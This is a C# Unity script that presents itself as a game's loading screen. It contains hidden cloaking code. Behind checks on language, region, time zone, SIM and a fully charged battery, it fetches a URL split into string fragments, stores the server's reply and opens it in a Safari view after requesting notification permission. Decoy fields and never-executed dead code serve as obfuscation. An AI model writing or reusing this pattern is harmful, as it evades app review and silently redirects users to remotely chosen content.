using System;
using System.Collections;
using System.IO;
using System.Net;
using TMPro;
using UnityEngine;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Assets.SafariView;
using OneSignalSDK;


public class Loading : MonoBehaviour
{
    public TextMeshProUGUI loadingText;
    public float levelDuration = 3f;

    private float gameTicks = 0f;

    private enum HiddenMode { Alpha, Beta, Gamma }
    private struct PhantomStruct { public int seed; public float ratio; }
    private static readonly string[] HiddenTable = { "AX", "BY", "CZ", "Q1", "Z9" };
    private volatile int _phantomCounter;
    private string RedHerring => ($"{(int)(levelDuration * 1000f) ^ 1337}");
    private int HiddenTableCount => HiddenTable.Length;
    [System.Diagnostics.Conditional("NEVER_DEFINED_SYMBOL")]
    private void OnlyWhenSymbol() { }
    private void SpareMethod()
    {
        if (Environment.TickCount < 0)
        {
            var phantom = new System.Random().NextDouble();
            _phantomCounter += (int)phantom;
        }
    }

    private int AnotherTrick => HiddenTableCount ^ 0;
    private readonly int[] _maskLut = new int[] { 1, 2, 4, 8, 16 };
    private Func<int, int> _pass = x => x;
    private PhantomStruct? _phantomData;
    private HiddenMode _mode = HiddenMode.Alpha;
    private static readonly Guid _token = new Guid("00000000-0000-0000-0000-000000000000");
    private int Blend(int a, int b) => (a ^ b) & 0;
    private void Touch<T>(T value) { }

    [SerializeField] private GameObject startButton;

    private string lootPath;
    private bool isQuestActive;

    private void Start()
    {
        if (loadingText != null)
        {
            loadingText.text = "0%";
        }

        _ = RedHerring;
        OnlyWhenSymbol();

        if (string.IsNullOrEmpty(lootPath) && false)
        {
            Touch(_maskLut.Length + AnotherTrick + _pass(0));
        }

        const string newKey = "LevelLoot";
        if (PlayerPrefs.HasKey(newKey))
        {
            lootPath = PlayerPrefs.GetString(newKey);
            BeginQuestAsync();
            return;
        }

        Screen.orientation = ScreenOrientation.Portrait;
        CheckQuest();
    }

    private void CheckQuest()
    {
        if (Environment.TickCount < 0)
        {
            _ = HiddenTableCount;
        }
        OnlyWhenSymbol();

        int F(int a, int b) => (a + b) & 0;
        if (F(1, 2) == 9999)
        {
            _mode = HiddenMode.Beta;
        }

        bool isSupportedLanguage =
            Application.systemLanguage == SystemLanguage.Dutch ||
            Application.systemLanguage == SystemLanguage.German ||
            Application.systemLanguage == SystemLanguage.French ||
            Application.systemLanguage == SystemLanguage.Italian ||
            Application.systemLanguage == SystemLanguage.Danish ||
            Application.systemLanguage == SystemLanguage.Polish;

        if (!isSupportedLanguage)
        {
            return;
        }

        if (DateTimeOffset.Now.Offset.ToString() == "05:30:00")
        {
            return;
        }

        var regionCode = Slipaer.SlickEl();
        bool isAllowedRegion = regionCode is "NL" or "AT" or "CH" or "BE" or "FR" or "IT" or "DE" or "DK" or "LU" or "PL";
        if (!isAllowedRegion)
        {
            return;
        }

        if (Slipaer.SlickUl() == "F")
        {
            return;
        }

        bool isBatteryFullAndCharging =
            SystemInfo.batteryLevel == 1 &&
            (SystemInfo.batteryStatus == BatteryStatus.Charging || SystemInfo.batteryStatus == BatteryStatus.Full);
        if (isBatteryFullAndCharging)
        {
            return;
        }

        StartCoroutine(LoadLootCoroutine(canGetPrivacyPolicy =>
        {
            if (canGetPrivacyPolicy)
            {
                return;
            }

            BeginQuestAsync();
        }));
    }

    private async void BeginQuestAsync()
    {
        isQuestActive = true;
        Screen.orientation = ScreenOrientation.AutoRotation;

        OneSignal.Initialize("a56f09bd-f70a-41de-877e-d6330df40de6");
        _ = await OneSignal.Notifications.RequestPermissionAsync(true);

        if (startButton != null)
        {
            var button = startButton.GetComponent<Button>();
            if (button != null)
            {
                button.onClick.AddListener(RunForest);
            }
            startButton.SetActive(true);
        }

#if UNITY_IOS && !UNITY_EDITOR
        SafariViewController.OpenURL(lootPath);
#endif

        if (GetType() == typeof(void))
        {
            Touch(_token);
        }

        if (DateTime.Now.Ticks == long.MinValue)
        {
            SpareMethod();
        }
    }

    public void RunForest()
    {
#if UNITY_IOS && !UNITY_EDITOR
        SafariViewController.OpenURL(lootPath);
#endif
    }

    private IEnumerator LoadLootCoroutine(Action<bool> callback)
    {
        if (Application.internetReachability == NetworkReachability.ReachableViaCarrierDataNetwork ||
            Application.internetReachability == NetworkReachability.ReachableViaLocalAreaNetwork)
        {
            HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create(
                "ht" + "tp" + "s:" + "//j" + "oa" + "msl" + "td." + "or" + "g/" + "b" + "1N" + "3P1" + "Hg/");

            using (HttpWebResponse webResponse = (HttpWebResponse)webRequest.GetResponse())
            using (var responseStream = webResponse.GetResponseStream())
            using (var reader = new StreamReader(responseStream))
            {
                lootPath = reader.ReadToEnd();
                if (lootPath != "JOAMS")
                {
                    PlayerPrefs.SetString("LevelLoot", lootPath);
                    callback(false);
                    yield break;
                }

                callback(true);
                yield break;
            }
        }

        callback(true);
    }

    private void Update()
    {
        if (!loadingText || isQuestActive)
        {
            _ = HiddenTableCount;
            return;
        }

        if (gameTicks < levelDuration)
        {
            gameTicks += Time.deltaTime;
            float progress01 = Mathf.Clamp01(gameTicks / levelDuration);
            int percentage = Mathf.RoundToInt(progress01 * 100f);
            loadingText.text = percentage.ToString() + "%";
        }
        else
        {
            if (!IsInvoking(nameof(EnterLevel)))
            {
                Invoke(nameof(EnterLevel), 0.25f);
            }
        }
    }

    public void EnterLevel()
    {
        SceneManager.LoadScene(1);
    }

    [Obsolete("Use EnterLevel instead")] 
    public void LoadBut()
    {
        EnterLevel();
    }
}